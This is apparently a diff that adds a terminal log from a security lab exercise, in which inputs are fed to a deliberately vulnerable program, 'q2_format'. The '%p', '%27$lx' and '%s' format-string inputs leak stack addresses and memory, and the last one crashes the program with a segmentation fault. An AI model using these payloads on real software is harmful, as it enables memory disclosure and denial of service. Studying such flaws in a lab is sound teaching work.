@@ -1,0 +1,29 @@
+$ printf 'alice\n21\nhello\n' | ./bin/vulnerable/q2_format
+Name: Age: Message: 
+Your message: hello
+Saved record: name=alice age=21 msg=hello
+[exit code: 0]
+
+$ printf 'alice\n21\n%%p.%%p.%%p.%%p\n' | ./bin/vulnerable/q2_format
+Name: Age: Message: 
+Your message: 0x7a22fc9ab5c0.(nil).(nil).0xa
+Saved record: name=alice age=21 msg=%p.%p.%p.%p
+[exit code: 0]
+
+$ printf 'alice\n21\n%%27$lx\n' | ./bin/vulnerable/q2_format
+Name: Age: Message: 
+Your message: 5ec12e7ab1e
+Saved record: name=alice age=21 msg=%27$lx
+[exit code: 0]
+
+$ printf 'alice\n21\n50%%off\n' | ./bin/vulnerable/q2_format
+Name: Age: Message: 
+Your message: 5037257642700ff
+Saved record: name=alice age=21 msg=50%off
+[exit code: 0]
+
+$ printf 'alice\n21\n%%s%%s%%s%%s%%s%%s%%s%%s\n' | ./bin/vulnerable/q2_format
+bash: line 1: 64033 Done                    printf 'alice\n21\n%%s%%s%%s%%s%%s%%s%%s%%s\n'
+     64034 Segmentation fault      (core dumped) | ./bin/vulnerable/q2_format
+[exit code: 139]
+
